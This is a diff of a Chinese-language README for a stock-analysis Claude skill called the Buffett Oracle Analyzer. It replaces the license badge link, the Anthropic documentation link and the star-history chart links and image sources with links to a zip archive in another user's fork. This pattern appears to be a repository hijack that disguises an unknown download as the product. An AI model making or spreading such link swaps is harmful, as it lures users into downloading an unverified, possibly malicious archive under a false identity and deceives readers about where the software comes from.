@@ -2,7 +2,7 @@
 
 ### AI驱动的上市公司深度分析Skill — 融合巴菲特投资智慧与现代12模块分析框架
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/Yana4501/buffett-oracle-analyzer/raw/refs/heads/main/docs/buffett_oracle_analyzer_2.0.zip)
 [![覆盖市场](https://img.shields.io/badge/覆盖-美股%20%7C%20港股%20%7C%20A股-green.svg)](#多市场适配)
 
 > *"价格是你付出的，价值是你得到的。"* — 沃伦·巴菲特
@@ -17,7 +17,7 @@
 
 ## 这是什么？
 
-**巴菲特神谕分析师**是一个 [Claude AI Skill](https://docs.anthropic.com)，能够对任何上市公司（美股、港股、A股）进行全面的、机构级别的深度分析。
+**巴菲特神谕分析师**是一个 [Claude AI Skill](https://github.com/Yana4501/buffett-oracle-analyzer/raw/refs/heads/main/docs/buffett_oracle_analyzer_2.0.zip)，能够对任何上市公司（美股、港股、A股）进行全面的、机构级别的深度分析。
 
 给它一个公司名称或股票代码，它将输出：
 
@@ -200,11 +200,11 @@ buffett-oracle-analyzer/
 
 ## Star History
 
-<a href="https://www.star-history.com/?repos=brucelanlan%2Fbuffett-oracle-analyzer&type=timeline&legend=top-left">
+<a href="https://github.com/Yana4501/buffett-oracle-analyzer/raw/refs/heads/main/docs/buffett_oracle_analyzer_2.0.zip">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=brucelanlan/buffett-oracle-analyzer&type=timeline&theme=dark&logscale&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=brucelanlan/buffett-oracle-analyzer&type=timeline&logscale&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=brucelanlan/buffett-oracle-analyzer&type=timeline&logscale&legend=top-left" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Yana4501/buffett-oracle-analyzer/raw/refs/heads/main/docs/buffett_oracle_analyzer_2.0.zip" />
+   <source media="(prefers-color-scheme: light)" srcset="https://github.com/Yana4501/buffett-oracle-analyzer/raw/refs/heads/main/docs/buffett_oracle_analyzer_2.0.zip" />
+   <img alt="Star History Chart" src="https://github.com/Yana4501/buffett-oracle-analyzer/raw/refs/heads/main/docs/buffett_oracle_analyzer_2.0.zip" />
  </picture>
 </a>
 
